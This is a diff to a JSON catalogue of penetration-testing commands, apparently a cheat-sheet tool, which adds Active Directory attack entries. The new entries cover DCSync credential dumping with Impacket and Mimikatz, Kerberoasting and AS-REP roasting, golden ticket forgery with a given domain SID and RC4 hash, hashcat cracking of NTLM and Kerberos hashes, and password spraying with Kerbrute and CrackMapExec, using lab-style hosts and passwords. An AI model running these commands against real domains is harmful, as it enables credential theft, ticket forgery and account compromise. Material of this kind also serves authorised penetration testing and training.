@@ -1,5 +1,5 @@
 {
-  "Version": "1.0.0.6",
+  "Version": "1.0.0.7",
   "Categories": [
     {
       "id": 0,
@@ -99,6 +99,111 @@
     }
   ],
   "commands": [
+    {
+      "Name": "Impacket-SecretsDump - Dump DC Hash for User (Just DC User)",
+      "Category": 9,
+      "Description": "Impacket: Extract NTLM hash of 'dave' from domain controller using DCSync-like method",
+      "Command": "impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:\"BrouhahaTungPerorateBroom2023\\!\"@192.168.50.70",
+      "OS": "Linux"
+    },
+    {
+      "Name": "Mimikatz - DCSync Administrator Hash",
+      "Category": 16,
+      "Description": "Mimikatz: Perform DCSync to retrieve Administrator account hash from DC",
+      "Command": "lsadump::dcsync /user:corp\\Administrator",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Hashcat - Crack NTLM Hash (Mode 1000)",
+      "Category": 13,
+      "Description": "Hashcat: Crack DCSync NTLM hashes using rockyou and best64 rules",
+      "Command": "hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
+      "OS": "Linux"
+    },
+    {
+      "Name": "PowerShell - Invoke-WebRequest with Default Credentials",
+      "Category": 15,
+      "Description": "PowerShell: Download file from internal web server using current user credentials",
+      "Command": "iwr -UseDefaultCredentials http://web04",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Klist - List Kerberos Tickets",
+      "Category": 17,
+      "Description": "Windows: Display current Kerberos TGT and service tickets",
+      "Command": "klist",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Mimikatz - Golden Ticket with Pass-the-Ticket",
+      "Category": 16,
+      "Description": "Mimikatz: Forge golden ticket and inject into session for HTTP service",
+      "Command": "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781885555 /domain:core.com /ptt /target:fake04.core.com /service:http /rc4:4d28cf5252d36621419580a51484ca09 /user:testuser",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Whoami - Display Current User SID",
+      "Category": 17,
+      "Description": "Windows: Show current user and associated SID",
+      "Command": "whoami /user",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Hashcat - Crack Kerberoast Hash (Mode 13100)",
+      "Category": 13,
+      "Description": "Hashcat: Crack Kerberoasted service ticket hashes with rules",
+      "Command": "sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force",
+      "OS": "Linux"
+    },
+    {
+      "Name": "Impacket-GetUserSPNs - Request Kerberoastable Tickets",
+      "Category": 9,
+      "Description": "Impacket: Request TGS for SPNs and extract crackable hashes",
+      "Command": "sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete",
+      "OS": "Linux"
+    },
+    {
+      "Name": "Rubeus - Kerberoast All SPNs",
+      "Category": 9,
+      "Description": "Rubeus: Enumerate and request TGS for all roastable SPNs, output hashes",
+      "Command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Rubeus - ASREPRoast Pre-Auth Disabled Accounts",
+      "Category": 9,
+      "Description": "Rubeus: Perform AS-REPRoast attack on accounts without pre-auth",
+      "Command": ".\\Rubeus.exe asreproast /nowrap",
+      "OS": "Windows"
+    },
+    {
+      "Name": "Impacket-GetNPUsers - ASREPRoast Attack",
+      "Category": 9,
+      "Description": "Impacket: Target users without Kerberos pre-auth and save hashes",
+      "Command": "impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete",
+      "OS": "Linux"
+    },
+    {
+      "Name": "Kerbrute - Password Spray Single User",
+      "Category": 8,
+      "Description": "Kerbrute: Spray password against single user without locking accounts",
+      "Command": ".\\kerbrute_windows_amd64.exe passwordspray -d corp.com .\\usernames.txt \"Nexus555!\"",
+      "OS": "Windows"
+    },
+    {
+      "Name": "CrackMapExec - SMB Login Single Creds",
+      "Category": 8,
+      "Description": "CME: Test single credential pair against SMB on target",
+      "Command": "crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com",
+      "OS": "Linux"
+    },
+    {
+      "Name": "CrackMapExec - SMB Password Spray",
+      "Category": 8,
+      "Description": "CME: Spray single password against list of users over SMB",
+      "Command": "crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success",
+      "OS": "Linux"
+    },    
     {
       "Name": "Brute HTTP Login",
       "Category": 4,
